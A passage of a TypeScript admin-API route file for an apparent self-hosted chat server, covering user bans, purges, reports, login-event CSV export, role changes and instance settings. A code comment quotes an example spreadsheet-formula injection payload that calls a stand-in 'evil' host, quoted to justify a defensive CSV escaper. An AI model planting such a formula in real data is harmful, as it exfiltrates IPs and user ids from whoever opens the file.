/**
 * Admin API — only `users.role = 'admin'`. Grant that role manually in your database;
 * there is no automatic promotion or seed script in the application.
 */
import { desc, eq, and, gt, sql, isNull } from 'drizzle-orm'
import type { FastifyPluginAsync } from 'fastify'
import rateLimit from '@fastify/rate-limit'
import { z } from 'zod'
import { db } from '../db/index.js'
import {
  adminAuditLog,
  devices,
  guestInvites,
  loginEvents,
  pushSubscriptions,
  reports,
  users,
} from '../db/schema.js'
import {
  assertAuthed,
  getAuthUser,
  type AuthUser,
} from '../lib/auth-user.js'
import { adminPurgeUser } from '../lib/admin-purge-user.js'
import {
  collectKpi,
  collectSystemStats,
  collectUserStorageUsage,
} from '../lib/admin-system-stats.js'
import { createS3Client } from '../lib/s3.js'
import {
  evictLruUntilUnderTarget,
  getCurrentUsageBytes,
  getHighWatermark,
  getQuotaBytes,
  getTargetRatio,
  runOrphanAttachmentCleanup,
} from '../lib/media-lru-evict.js'
import {
  coerceValue,
  getSettingDef,
  getSettingsSnapshot,
  setSetting,
} from '../lib/instance-settings.js'
import {
  SERVER_BUILT_AT,
  SERVER_COMMIT_SHA,
  SERVER_VERSION,
} from '../lib/build-info.js'
import { getLogCounters } from '../lib/log-counters.js'
import { getRedis } from '../lib/redis.js'
import { groupPatch } from '../lib/user-group.js'
import { uuidSchema } from '../lib/zod-uuid.js'

/**
 * CSV cell encoder for the login-events export.
 *
 * Beyond RFC-4180 quoting it neutralizes spreadsheet formulas: `user_agent` is
 * attacker-controlled on every failed /auth/login, so a header of
 * `=HYPERLINK("https://evil/?x="&A1,…)` lands verbatim in login-events.csv and
 * executes when a moderator opens it — exfiltrating the real IPs and user ids
 * sitting in the neighbouring cells. Applied to every column, not just the one.
 */
export function csvEscapeCell(v: unknown): string {
  if (v == null) return ''
  const raw = String(v)
  const guarded = /^[=+\-@\t\r]/.test(raw) ? `'${raw}` : raw
  const s = guarded.replace(/"/g, '""')
  return /[",\n]/.test(s) ? `"${s}"` : s
}

async function requireAdmin(
  request: Parameters<typeof getAuthUser>[0],
  reply: NonNullable<Parameters<typeof getAuthUser>[1]>
): Promise<AuthUser | null> {
  const user = await getAuthUser(request, reply)
  if (!assertAuthed(reply, user)) return null
  if (user.role !== 'admin') {
    void reply.status(403).send({ error: 'FORBIDDEN' })
    return null
  }
  return user
}

/**
 * Track E — write one audit row per mutating admin action. Best-effort:
 * a failed audit insert is logged but never blocks the underlying action.
 */
async function writeAudit(
  log: { error: (...args: unknown[]) => void },
  entry: {
    adminUserId: string
    action: string
    targetUserId?: string | null
    detail?: unknown
  }
): Promise<void> {
  try {
    await db.insert(adminAuditLog).values({
      adminUserId: entry.adminUserId,
      action: entry.action,
      targetUserId: entry.targetUserId ?? null,
      detail:
        entry.detail === undefined
          ? null
          : (entry.detail as Record<string, unknown>),
    })
  } catch (e) {
    log.error(e, 'admin audit log insert failed')
  }
}

/** Shared limit/offset query parser — default 100, hard cap 500. */
const pageQuerySchema = z.object({
  limit: z.coerce.number().int().min(1).max(500).optional(),
  offset: z.coerce.number().int().min(0).optional(),
})

const banBodySchema = z.object({
  banned: z.boolean(),
})

const purgeBodySchema = z.object({
  confirm_username: z.string().min(1).max(200),
})

export const adminRoutes: FastifyPluginAsync = async (app) => {
  await app.register(rateLimit, {
    // The dashboard fires 5+ calls on load; 20/min throttled normal use.
    max: 120,
    timeWindow: '1 minute',
  })

  app.get('/system-stats', async (request, reply) => {
    const admin = await requireAdmin(request, reply)
    if (!admin) return
    try {
      const s3 = createS3Client()
      const stats = await collectSystemStats(s3)
      return reply.send(stats)
    } catch (e) {
      request.log.error(e)
      return reply.status(500).send({ error: 'SYSTEM_STATS_FAILED' })
    }
  })

  app.get('/users/storage-usage', async (request, reply) => {
    const admin = await requireAdmin(request, reply)
    if (!admin) return
    try {
      const rows = await collectUserStorageUsage()
      return reply.send({ users: rows })
    } catch (e) {
      request.log.error(e)
      return reply.status(500).send({ error: 'STORAGE_USAGE_FAILED' })
    }
  })

  app.get('/users', async (request, reply) => {
    const admin = await requireAdmin(request, reply)
    if (!admin) return

    const q = pageQuerySchema.safeParse(request.query)
    if (!q.success) return reply.status(400).send({ error: 'INVALID_QUERY' })
    const limit = q.data.limit ?? 100
    const offset = q.data.offset ?? 0

    const [totalRow] = await db
      .select({ c: sql<number>`count(*)::int` })
      .from(users)
    const total = Number(totalRow?.c ?? 0)

    const rows = await db
      .select({
        id: users.id,
        username: users.username,
        role: users.role,
        group: users.userGroup,
        is_banned: users.isBanned,
      })
      .from(users)
      .orderBy(users.username)
      .limit(limit)
      .offset(offset)

    // Per-group totals so the panel can show counts without a second round-trip.
    const groupRows = await db
      .select({ group: users.userGroup, c: sql<number>`count(*)::int` })
      .from(users)
      .groupBy(users.userGroup)
    const groupCounts = Object.fromEntries(groupRows.map((r) => [r.group, Number(r.c)]))

    return reply.send({ users: rows, total, limit, offset, group_counts: groupCounts })
  })

  app.patch('/users/:id/ban', async (request, reply) => {
    const admin = await requireAdmin(request, reply)
    if (!admin) return

    const params = z
      .object({ id: uuidSchema })
      .safeParse(request.params)
    if (!params.success) {
      return reply.status(400).send({ error: 'INVALID_PARAMS' })
    }

    const parsed = banBodySchema.safeParse(request.body)
    if (!parsed.success) {
      return reply.status(400).send({ error: 'INVALID_BODY' })
    }

    // The `creator` group is immutable for PATCH /users/:id/group — but ban had
    // no such guard, so any admin could lock the instance owner out of their own
    // instance (and, via purge, delete them outright). Mirror the guard here.
    const [banTarget] = await db
      .select({ group: users.userGroup })
      .from(users)
      .where(eq(users.id, params.data.id))
      .limit(1)
    if (!banTarget) {
      return reply.status(404).send({ error: 'USER_NOT_FOUND' })
    }
    if (banTarget.group === 'creator') {
      return reply.status(403).send({ error: 'CREATOR_IMMUTABLE' })
    }

    const [after] = await db
      .update(users)
      .set({ isBanned: parsed.data.banned })
      .where(eq(users.id, params.data.id))
      .returning({
        id: users.id,
        username: users.username,
        role: users.role,
        group: users.userGroup,
        is_banned: users.isBanned,
      })

    if (!after) {
      return reply.status(404).send({ error: 'USER_NOT_FOUND' })
    }

    await writeAudit(request.log, {
      adminUserId: admin.id,
      action: parsed.data.banned ? 'user_ban' : 'user_unban',
      targetUserId: after.id,
      detail: { username: after.username, banned: parsed.data.banned },
    })

    return reply.send({ user: after })
  })

  app.post('/users/:id/purge', async (request, reply) => {
    const admin = await requireAdmin(request, reply)
    if (!admin) return

    const params = z
      .object({ id: uuidSchema })
      .safeParse(request.params)
    if (!params.success) {
      return reply.status(400).send({ error: 'INVALID_PARAMS' })
    }

    const parsed = purgeBodySchema.safeParse(request.body)
    if (!parsed.success) {
      return reply.status(400).send({ error: 'INVALID_BODY' })
    }

    const result = await adminPurgeUser({
      targetUserId: params.data.id,
      adminUserId: admin.id,
      confirmUsername: parsed.data.confirm_username.trim(),
    })

    if ('error' in result) {
      if (result.error === 'USER_NOT_FOUND') {
        return reply.status(404).send({ error: result.error })
      }
      return reply.status(400).send({ error: result.error })
    }

    await writeAudit(request.log, {
      adminUserId: admin.id,
      action: 'user_purge',
      targetUserId: params.data.id,
      detail: {
        confirm_username: parsed.data.confirm_username.trim(),
        purged_direct_chats: result.purged_direct_chats,
      },
    })

    return reply.send({
      ok: true,
      purged_direct_chats: result.purged_direct_chats,
      notified_user_ids: result.notified_user_ids,
    })
  })

  // Bulk purge: select N users and delete them with ONE admin-level
  // confirmation (the operator types their own handle) instead of typing each
  // target's username. Per-target CANNOT_DELETE_SELF / LAST_ADMIN guards still
  // apply; partial failures are reported per id rather than aborting the batch.
  app.post('/users/bulk-purge', async (request, reply) => {
    const admin = await requireAdmin(request, reply)
    if (!admin) return

    const parsed = z
      .object({
        ids: z.array(uuidSchema).min(1).max(100),
        confirm_username: z.string().trim().min(1).max(200),
      })
      .safeParse(request.body)
    if (!parsed.success) {
      return reply.status(400).send({ error: 'INVALID_BODY' })
    }
    if (parsed.data.confirm_username !== admin.username) {
      return reply.status(400).send({ error: 'CONFIRM_MISMATCH' })
    }

    const ids = [...new Set(parsed.data.ids)]
    const results: Array<{ id: string; ok: true } | { id: string; error: string }> = []
    for (const id of ids) {
      const result = await adminPurgeUser({
        targetUserId: id,
        adminUserId: admin.id,
        skipConfirm: true,
      })
      if ('error' in result) {
        results.push({ id, error: result.error })
      } else {
        results.push({ id, ok: true })
        await writeAudit(request.log, {
          adminUserId: admin.id,
          action: 'user_purge',
          targetUserId: id,
          detail: { bulk: true, purged_direct_chats: result.purged_direct_chats },
        })
      }
    }

    const purged = results.filter((r) => 'ok' in r).length
    return reply.send({ ok: true, purged, total: ids.length, results })
  })

  app.get('/reports', async (request, reply) => {
    const admin = await requireAdmin(request, reply)
    if (!admin) return

    const q = pageQuerySchema.safeParse(request.query)
    if (!q.success) return reply.status(400).send({ error: 'INVALID_QUERY' })
    const limit = q.data.limit ?? 100
    const offset = q.data.offset ?? 0

    const [totalRow] = await db
      .select({ c: sql<number>`count(*)::int` })
      .from(reports)
    const total = Number(totalRow?.c ?? 0)

    const rows = await db
      .select({
        id: reports.id,
        reporter_id: reports.reporterId,
        reported_id: reports.reportedId,
        reason: reports.reason,
        status: reports.status,
        created_at: reports.createdAt,
      })
      .from(reports)
      .orderBy(desc(reports.createdAt))
      .limit(limit)
      .offset(offset)

    return reply.send({ reports: rows, total, limit, offset })
  })

  /**
   * GET /api/admin/reports/:id/context — Sprint A1-2.
   * Bundles everything the moderator needs to triage one report:
   *   - report itself + reporter / reported usernames and ban state
   *   - count of other open reports against the same target
   *   - last 20 login events by the target (IP / outcome / UA)
   */
  app.get('/reports/:id/context', async (request, reply) => {
    const admin = await requireAdmin(request, reply)
    if (!admin) return

    const params = z.object({ id: uuidSchema }).safeParse(request.params)
    if (!params.success) return reply.status(400).send({ error: 'INVALID_PARAMS' })

    const [row] = await db
      .select({
        id: reports.id,
        reporter_id: reports.reporterId,
        reported_id: reports.reportedId,
        reason: reports.reason,
        status: reports.status,
        created_at: reports.createdAt,
      })
      .from(reports)
      .where(eq(reports.id, params.data.id))
      .limit(1)
    if (!row) return reply.status(404).send({ error: 'REPORT_NOT_FOUND' })

    const [reporter] = await db
      .select({ username: users.username, banned: users.isBanned })
      .from(users)
      .where(eq(users.id, row.reporter_id))
      .limit(1)
    const [reported] = await db
      .select({ username: users.username, banned: users.isBanned, role: users.role })
      .from(users)
      .where(eq(users.id, row.reported_id))
      .limit(1)

    const [openCount] = await db
      .select({ c: sql<number>`count(*)::int` })
      .from(reports)
      .where(
        and(
          eq(reports.reportedId, row.reported_id),
          eq(reports.status, 'open')
        )
      )

    const recentLogins = await db
      .select({
        outcome: loginEvents.outcome,
        ip_address: loginEvents.ipAddress,
        user_agent: loginEvents.userAgent,
        created_at: loginEvents.createdAt,
      })
      .from(loginEvents)
      .where(eq(loginEvents.userId, row.reported_id))
      .orderBy(desc(loginEvents.createdAt))
      .limit(20)

    return reply.send({
      report: row,
      reporter: reporter ?? null,
      reported: reported ?? null,
      open_reports_against_reported: Number(openCount?.c ?? 0),
      recent_logins_by_reported: recentLogins,
    })
  })

  /**
   * PATCH /api/admin/reports/:id — Sprint A1-2.
   * Close a report (status='closed') and optionally ban the reported
   * user in the same call. Returns the updated row.
   */
  app.patch('/reports/:id', async (request, reply) => {
    const admin = await requireAdmin(request, reply)
    if (!admin) return

    const params = z.object({ id: uuidSchema }).safeParse(request.params)
    if (!params.success) return reply.status(400).send({ error: 'INVALID_PARAMS' })
    const body = z
      .object({
        status: z.enum(['open', 'closed']).optional(),
        ban_reported: z.boolean().optional(),
      })
      .safeParse(request.body ?? {})
    if (!body.success) return reply.status(400).send({ error: 'INVALID_BODY' })

    const reportShape = {
      id: reports.id,
      reporter_id: reports.reporterId,
      reported_id: reports.reportedId,
      reason: reports.reason,
      status: reports.status,
      created_at: reports.createdAt,
    }

    // Only issue an UPDATE when a new status was supplied — drizzle's
    // `.set({})` emits invalid `UPDATE ... SET` SQL (Postgres 500). A
    // ban-only call (no status) just reads the report.
    const [updated] = body.data.status
      ? await db
          .update(reports)
          .set({ status: body.data.status })
          .where(eq(reports.id, params.data.id))
          .returning(reportShape)
      : await db
          .select(reportShape)
          .from(reports)
          .where(eq(reports.id, params.data.id))
          .limit(1)
    if (!updated) return reply.status(404).send({ error: 'REPORT_NOT_FOUND' })

    let banApplied = false
    if (body.data.ban_reported) {
      if (updated.reported_id === admin.id) {
        return reply.status(400).send({ error: 'CANNOT_BAN_SELF' })
      }
      await db.update(users).set({ isBanned: true }).where(eq(users.id, updated.reported_id))
      banApplied = true
    }

    await writeAudit(request.log, {
      adminUserId: admin.id,
      action: 'report_update',
      targetUserId: updated.reported_id,
      detail: {
        report_id: updated.id,
        status: body.data.status ?? null,
        ban_applied: banApplied,
      },
    })

    return reply.send({ report: updated, ban_applied: banApplied })
  })

  /** GET /api/admin/users/:id/devices — all devices for a user */
  app.get('/users/:id/devices', async (request, reply) => {
    const admin = await requireAdmin(request, reply)
    if (!admin) return

    const params = z.object({ id: uuidSchema }).safeParse(request.params)
    if (!params.success) return reply.status(400).send({ error: 'INVALID_PARAMS' })

    const rows = await db
      .select({
        id: devices.id,
        device_name: devices.deviceName,
        user_agent: devices.userAgent,
        ip_address: devices.ipAddress,
        last_active: devices.lastActive,
        revoked_at: devices.revokedAt,
        created_at: devices.createdAt,
      })
      .from(devices)
      .where(eq(devices.userId, params.data.id))
      .orderBy(desc(devices.lastActive))

    return reply.send({ devices: rows })
  })

  /** GET /api/admin/users/:id/login-history — last 50 login events */
  app.get('/users/:id/login-history', async (request, reply) => {
    const admin = await requireAdmin(request, reply)
    if (!admin) return

    const params = z.object({ id: uuidSchema }).safeParse(request.params)
    if (!params.success) return reply.status(400).send({ error: 'INVALID_PARAMS' })

    const rows = await db
      .select({
        id: loginEvents.id,
        outcome: loginEvents.outcome,
        ip_address: loginEvents.ipAddress,
        user_agent: loginEvents.userAgent,
        created_at: loginEvents.createdAt,
      })
      .from(loginEvents)
      .where(eq(loginEvents.userId, params.data.id))
      .orderBy(desc(loginEvents.createdAt))
      .limit(50)

    return reply.send({ events: rows })
  })

  /**
   * GET /api/admin/login-events — recent login events with optional filters.
   * Query: outcome=success|fail_signature|...; ip=substring; user_id=uuid;
   *        from=ISO; to=ISO; limit=1..1000 (default 200).
   * Sprint A1-3 — also serves text/csv when `Accept: text/csv` or `format=csv`.
   */
  app.get('/login-events', async (request, reply) => {
    const admin = await requireAdmin(request, reply)
    if (!admin) return

    const q = z
      .object({
        outcome: z.string().min(1).max(40).optional(),
        ip: z.string().min(1).max(64).optional(),
        user_id: uuidSchema.optional(),
        from: z.string().datetime().optional(),
        to: z.string().datetime().optional(),
        limit: z.coerce.number().int().min(1).max(1000).optional(),
        format: z.enum(['json', 'csv']).optional(),
      })
      .safeParse(request.query)
    if (!q.success) return reply.status(400).send({ error: 'INVALID_QUERY' })

    const conditions = []
    if (q.data.outcome) {
      conditions.push(
        eq(loginEvents.outcome, q.data.outcome as typeof loginEvents.outcome.enumValues[number])
      )
    }
    if (q.data.user_id) conditions.push(eq(loginEvents.userId, q.data.user_id))
    if (q.data.ip) {
      conditions.push(sql`${loginEvents.ipAddress} ILIKE ${`%${q.data.ip}%`}`)
    }
    if (q.data.from) {
      conditions.push(sql`${loginEvents.createdAt} >= ${q.data.from}::timestamptz`)
    }
    if (q.data.to) {
      conditions.push(sql`${loginEvents.createdAt} <= ${q.data.to}::timestamptz`)
    }

    const where = conditions.length ? and(...conditions) : undefined

    const rows = await db
      .select({
        id: loginEvents.id,
        user_id: loginEvents.userId,
        outcome: loginEvents.outcome,
        ip_address: loginEvents.ipAddress,
        user_agent: loginEvents.userAgent,
        created_at: loginEvents.createdAt,
      })
      .from(loginEvents)
      .where(where)
      .orderBy(desc(loginEvents.createdAt))
      .limit(q.data.limit ?? 200)

    const wantsCsv =
      q.data.format === 'csv' || /text\/csv/i.test(request.headers.accept ?? '')
    if (wantsCsv) {
      const header = 'id,user_id,outcome,ip_address,user_agent,created_at\n'
      const body = rows
        .map((r) =>
          [r.id, r.user_id, r.outcome, r.ip_address, r.user_agent, r.created_at]
            .map(csvEscapeCell)
            .join(',')
        )
        .join('\n')
      return reply
        .type('text/csv; charset=utf-8')
        .header('Content-Disposition', 'attachment; filename="login-events.csv"')
        .send(header + body + '\n')
    }

    return reply.send({ events: rows })
  })

  /** GET /api/admin/push-stats — push subscription count per user */
  app.get('/push-stats', async (request, reply) => {
    const admin = await requireAdmin(request, reply)
    if (!admin) return

    const rows = await db
      .select({
        user_id: pushSubscriptions.userId,
        count: sql<number>`cast(count(*) as int)`,
      })
      .from(pushSubscriptions)
      .groupBy(pushSubscriptions.userId)

    return reply.send({ push_subscriptions: rows })
  })

  /** PATCH /api/admin/users/:id/role — promote/demote user role */
  app.patch('/users/:id/role', async (request, reply) => {
    const admin = await requireAdmin(request, reply)
    if (!admin) return

    const params = z.object({ id: uuidSchema }).safeParse(request.params)
    if (!params.success) return reply.status(400).send({ error: 'INVALID_PARAMS' })

    const body = z.object({ role: z.enum(['user', 'admin']) }).safeParse(request.body)
    if (!body.success) return reply.status(400).send({ error: 'INVALID_BODY' })

    if (params.data.id === admin.id) return reply.status(400).send({ error: 'CANNOT_CHANGE_OWN_ROLE' })

    // Legacy endpoint — keep the group in sync with the role it sets so the two
    // never drift (the panel now drives changes through /group). Admin grants are
    // creator-only there; mirror that guard here.
    if (admin.group !== 'creator') return reply.status(403).send({ error: 'CREATOR_ONLY' })
    const nextGroup = body.data.role === 'admin' ? 'admin' : 'regular'
    const [after] = await db
      .update(users)
      .set(groupPatch(nextGroup))
      .where(eq(users.id, params.data.id))
      .returning({ id: users.id, username: users.username, role: users.role, group: users.userGroup, is_banned: users.isBanned })

    if (!after) return reply.status(404).send({ error: 'USER_NOT_FOUND' })

    await writeAudit(request.log, {
      adminUserId: admin.id,
      action: 'user_role_change',
      targetUserId: after.id,
      detail: { username: after.username, role: body.data.role },
    })

    return reply.send({ user: after })
  })

  /**
   * PATCH /api/admin/users/:id/group — set a user's account group/tier.
   * Rules: the `creator` group is immutable + unassignable; granting OR revoking
   * `admin` is creator-only (no admin can escalate self/peers); `role` is kept in
   * sync (admin -> 'admin', otherwise 'user').
   */
  app.patch('/users/:id/group', async (request, reply) => {
    const admin = await requireAdmin(request, reply)
    if (!admin) return

    const params = z.object({ id: uuidSchema }).safeParse(request.params)
    if (!params.success) return reply.status(400).send({ error: 'INVALID_PARAMS' })

    const body = z
      .object({ group: z.enum(['admin', 'premium', 'regular', 'test']) })
      .safeParse(request.body)
    if (!body.success) return reply.status(400).send({ error: 'INVALID_BODY' })

    if (params.data.id === admin.id) {
      return reply.status(400).send({ error: 'CANNOT_CHANGE_OWN_GROUP' })
    }

    const [target] = await db
      .select({ id: users.id, username: users.username, group: users.userGroup })
      .from(users)
      .where(eq(users.id, params.data.id))
      .limit(1)
    if (!target) return reply.status(404).send({ error: 'USER_NOT_FOUND' })

    const newGroup = body.data.group
    if (target.group === 'creator') {
      return reply.status(403).send({ error: 'CREATOR_IMMUTABLE' })
    }
    const touchesAdmin = newGroup === 'admin' || target.group === 'admin'
    if (touchesAdmin && admin.group !== 'creator') {
      return reply.status(403).send({ error: 'CREATOR_ONLY' })
    }

    const [after] = await db
      .update(users)
      .set(groupPatch(newGroup))
      .where(eq(users.id, params.data.id))
      .returning({
        id: users.id,
        username: users.username,
        role: users.role,
        group: users.userGroup,
        is_banned: users.isBanned,
      })
    if (!after) return reply.status(404).send({ error: 'USER_NOT_FOUND' })

    await writeAudit(request.log, {
      adminUserId: admin.id,
      action: 'user_group_change',
      targetUserId: after.id,
      detail: { username: after.username, from: target.group, to: newGroup },
    })

    return reply.send({ user: after })
  })

  /** DELETE /api/admin/devices/:deviceId — force-revoke a specific device */
  app.delete('/devices/:deviceId', async (request, reply) => {
    const admin = await requireAdmin(request, reply)
    if (!admin) return

    const params = z.object({ deviceId: uuidSchema }).safeParse(request.params)
    if (!params.success) return reply.status(400).send({ error: 'INVALID_PARAMS' })

    const [updated] = await db
      .update(devices)
      .set({ revokedAt: new Date() })
      .where(and(eq(devices.id, params.data.deviceId), isNull(devices.revokedAt)))
      .returning({ id: devices.id })

    if (!updated) return reply.status(404).send({ error: 'DEVICE_NOT_FOUND' })

    await writeAudit(request.log, {
      adminUserId: admin.id,
      action: 'device_revoke',
      detail: { device_id: updated.id },
    })

    return reply.send({ ok: true, device_id: updated.id })
  })

  /**
   * PATCH /api/admin/users/:id/storage-quota — Sprint A1-5.
   * Body: { quota_bytes: number | null }
   *   number > 0  — explicit per-user cap.
   *   number == 0 — unlimited (no per-user cap, only global).
   *   null        — clear override; falls back to MEDIA_QUOTA_PER_USER_BYTES env.
   */
  app.patch('/users/:id/storage-quota', async (request, reply) => {
    const admin = await requireAdmin(request, reply)
    if (!admin) return
    const params = z.object({ id: uuidSchema }).safeParse(request.params)
    if (!params.success) return reply.status(400).send({ error: 'INVALID_PARAMS' })
    const body = z
      .object({ quota_bytes: z.number().int().min(0).max(1_000_000_000_000).nullable() })
      .safeParse(request.body)
    if (!body.success) return reply.status(400).send({ error: 'INVALID_BODY' })

    const [updated] = await db
      .update(users)
      .set({ storageQuotaBytes: body.data.quota_bytes })
      .where(eq(users.id, params.data.id))
      .returning({
        id: users.id,
        storage_quota_bytes: users.storageQuotaBytes,
      })
    if (!updated) return reply.status(404).send({ error: 'USER_NOT_FOUND' })

    await writeAudit(request.log, {
      adminUserId: admin.id,
      action: 'storage_quota_change',
      targetUserId: updated.id,
      detail: { quota_bytes: body.data.quota_bytes },
    })

    return reply.send(updated)
  })

  /** GET /api/admin/kpi — Sprint A1-4 dashboard aggregates. */
  app.get('/kpi', async (request, reply) => {
    const admin = await requireAdmin(request, reply)
    if (!admin) return
    const kpi = await collectKpi()
    return reply.send(kpi)
  })

  /** GET /api/admin/media/quota — current usage, quota, watermarks. */
  app.get('/media/quota', async (request, reply) => {
    const admin = await requireAdmin(request, reply)
    if (!admin) return
    const usage = await getCurrentUsageBytes()
    const quota = getQuotaBytes()
    const high = Math.floor(quota * getHighWatermark())
    const target = Math.floor(quota * getTargetRatio())
    return reply.send({
      usage_bytes: usage,
      quota_bytes: quota,
      high_watermark_bytes: high,
      target_bytes: target,
      pct_used: quota > 0 ? +(usage / quota).toFixed(4) : 0,
    })
  })

  /**
   * POST /api/admin/media/evict — force LRU eviction down to target.
   * Body: { target_bytes?: number, max_to_evict?: number }
   */
  app.post('/media/evict', async (request, reply) => {
    const admin = await requireAdmin(request, reply)
    if (!admin) return
    const body = z
      .object({
        target_bytes: z.number().int().nonnegative().optional(),
        max_to_evict: z.number().int().positive().max(50_000).optional(),
      })
      .safeParse(request.body ?? {})
    if (!body.success) return reply.status(400).send({ error: 'INVALID_BODY' })
    const result = await evictLruUntilUnderTarget({
      log: request.log,
      targetBytes: body.data.target_bytes,
      maxToEvict: body.data.max_to_evict,
    })

    await writeAudit(request.log, {
      adminUserId: admin.id,
      action: 'media_evict',
      detail: {
        target_bytes: body.data.target_bytes ?? null,
        max_to_evict: body.data.max_to_evict ?? null,
        evicted: result.evicted,
        freed_bytes: result.freedBytes,
      },
    })

    return reply.send(result)
  })

  /**
   * POST /api/admin/media/cleanup-orphans — delete upload-url objects that
   * never became message attachments.
   */
  app.post('/media/cleanup-orphans', async (request, reply) => {
    const admin = await requireAdmin(request, reply)
    if (!admin) return
    const body = z
      .object({
        max_age_hours: z.number().int().positive().max(24 * 30).optional(),
        max_to_delete: z.number().int().positive().max(50_000).optional(),
      })
      .safeParse(request.body ?? {})
    if (!body.success) return reply.status(400).send({ error: 'INVALID_BODY' })
    const result = await runOrphanAttachmentCleanup({
      log: request.log,
      maxAgeHours: body.data.max_age_hours,
      maxToDelete: body.data.max_to_delete,
    })

    await writeAudit(request.log, {
      adminUserId: admin.id,
      action: 'media_cleanup_orphans',
      detail: {
        max_age_hours: body.data.max_age_hours ?? null,
        max_to_delete: body.data.max_to_delete ?? null,
        deleted: result.deleted,
        freed_bytes: result.freedBytes,
      },
    })

    return reply.send(result)
  })

  /**
   * GET /api/admin/audit-log — Track E. Paginated admin action audit trail,
   * newest first. Joins the admin username for display.
   * Query: limit=1..500 (default 100), offset>=0.
   */
  app.get('/audit-log', async (request, reply) => {
    const admin = await requireAdmin(request, reply)
    if (!admin) return

    const q = pageQuerySchema.safeParse(request.query)
    if (!q.success) return reply.status(400).send({ error: 'INVALID_QUERY' })
    const limit = q.data.limit ?? 100
    const offset = q.data.offset ?? 0

    const [totalRow] = await db
      .select({ c: sql<number>`count(*)::int` })
      .from(adminAuditLog)
    const total = Number(totalRow?.c ?? 0)

    const rows = await db
      .select({
        id: adminAuditLog.id,
        admin_user_id: adminAuditLog.adminUserId,
        admin_username: users.username,
        action: adminAuditLog.action,
        target_user_id: adminAuditLog.targetUserId,
        detail: adminAuditLog.detail,
        created_at: adminAuditLog.createdAt,
      })
      .from(adminAuditLog)
      .leftJoin(users, eq(users.id, adminAuditLog.adminUserId))
      .orderBy(desc(adminAuditLog.createdAt))
      .limit(limit)
      .offset(offset)

    return reply.send({ entries: rows, total, limit, offset })
  })

  /**
   * GET /api/admin/settings — every runtime knob with its whole resolution
   * chain (built-in default → env → DB override → effective), plus the
   * env-only feature flags rendered read-only next to them.
   *
   * The flags are here on purpose even though they cannot be changed from the
   * panel: an operator debugging "why is there no call button" needs to see
   * that FEATURE_CALLS is off, and the alternative was reading `.env` over SSH.
   */
  app.get('/settings', async (request, reply) => {
    const admin = await requireAdmin(request, reply)
    if (!admin) return
    const settings = await getSettingsSnapshot()
    // Env-only, restart-required flags, straight off the boot snapshot — not a
    // hand-copied literal, so the NEXT flag added to FeatureFlags shows up here
    // without anyone remembering this endpoint. Open registration is absent by
    // construction: it is in `settings` above, where it can be changed.
    return reply.send({ settings, feature_flags: request.server.featureFlags })
  })

  /**
   * PATCH /api/admin/settings — set or clear ONE override.
   * Body: `{ key, value }`, where `value: null` deletes the override and hands
   * the knob back to the environment.
   *
   * Creator-only, like admin grants: these knobs decide whether strangers can
   * create accounts and how much of the server a guest link can spend. An
   * admin who could quietly re-open registration is an escalation path.
   */
  app.patch('/settings', async (request, reply) => {
    const admin = await requireAdmin(request, reply)
    if (!admin) return
    if (admin.group !== 'creator') {
      return reply.status(403).send({ error: 'CREATOR_ONLY' })
    }

    const body = z
      .object({
        key: z.string().min(1).max(64),
        value: z.union([z.boolean(), z.number(), z.null()]),
      })
      .safeParse(request.body)
    if (!body.success) return reply.status(400).send({ error: 'INVALID_BODY' })

    const def = getSettingDef(body.data.key)
    if (!def) return reply.status(404).send({ error: 'UNKNOWN_SETTING' })
    if (body.data.value !== null && coerceValue(def, body.data.value) === undefined) {
      return reply.status(400).send({ error: 'INVALID_VALUE' })
    }

    const effective = await setSetting(def.key, body.data.value, admin.id)

    await writeAudit(request.log, {
      adminUserId: admin.id,
      action: 'instance_setting_change',
      detail: {
        key: def.key,
        requested: body.data.value,
        effective,
        cleared: body.data.value === null,
      },
    })

    const settings = await getSettingsSnapshot()
    return reply.send({
      setting: settings.find((s) => s.key === def.key) ?? null,
      settings,
    })
  })

  /**
   * GET /api/admin/instance — "what am I actually running", in one call.
   *
   * Everything here was previously only answerable by SSH-ing to the host:
   * which build is live, whether Redis is really connected (the API falls back
   * to in-memory stores and keeps serving), whether LiveKit is configured, and
   * how many guests/links are alive right now.
   */
  app.get('/instance', async (request, reply) => {
    const admin = await requireAdmin(request, reply)
    if (!admin) return

    const now = new Date()
    const redis = getRedis()
    const guestsEnabled = request.server.featureFlags.guests

    // Every probe below is independent, and this is the card an operator opens
    // BECAUSE something is wrong — so they run together. Serially, a hung Redis
    // spent its whole 1.5s budget before the counts were even issued, and the
    // answer to "is Redis down?" arrived after four more round trips.
    const [dbProbe, redisProbe, guestProbe, inviteProbe, creatorProbe] =
      await Promise.allSettled([
        db.execute(sql`SELECT 1`),
        redis
          ? // Bounded: a Redis that is unreachable rather than refusing does
            // not reject the ping, it just never answers. Waiting forever to
            // report "Redis is down" is the one behaviour this panel must not
            // have.
            Promise.race([
              redis.ping(),
              new Promise<string>((resolve) =>
                setTimeout(() => resolve('TIMEOUT'), 1500).unref?.()
              ),
            ])
          : Promise.resolve(null),
        guestsEnabled
          ? db
              .select({ n: sql<number>`count(*)::int` })
              .from(users)
              // The SAME predicate the capacity limiter enforces in
              // routes/guest.ts — group AND not yet expired. Counting
              // expired-but-unswept rows here would show the operator a number
              // at the cap while the limiter happily kept admitting guests.
              .where(
                and(
                  eq(users.userGroup, 'guest'),
                  gt(users.guestExpiresAt, now)
                )
              )
          : Promise.resolve([{ n: 0 }]),
        guestsEnabled
          ? db
              .select({ n: sql<number>`count(*)::int` })
              .from(guestInvites)
              .where(
                and(
                  isNull(guestInvites.revokedAt),
                  gt(guestInvites.expiresAt, now),
                  sql`${guestInvites.usedCount} < ${guestInvites.maxUses}`
                )
              )
          : Promise.resolve([{ n: 0 }]),
        // A server with no creator cannot grant or revoke admin rights, cannot
        // change an instance setting, and gives its operator a panel that looks
        // functional and refuses half of what it offers. Surfacing the count is
        // what turns that into a fixable message instead of a mystery 403.
        db
          .select({ n: sql<number>`count(*)::int` })
          .from(users)
          .where(eq(users.userGroup, 'creator')),
      ])

    const dbOk = dbProbe.status === 'fulfilled'
    const redisOk = !redis
      ? null
      : redisProbe.status === 'fulfilled' && redisProbe.value === 'PONG'

    // A count that failed reports 0 rather than 500-ing the whole card: when
    // the database is down the operator needs the rest of this page, and `db`
    // above already says why the numbers are meaningless.
    const countOf = (r: PromiseSettledResult<{ n: number }[]>): number =>
      r.status === 'fulfilled' ? Number(r.value[0]?.n ?? 0) : 0

    return reply.send({
      version: SERVER_VERSION,
      commit: SERVER_COMMIT_SHA,
      built_at: SERVER_BUILT_AT,
      node_version: process.version,
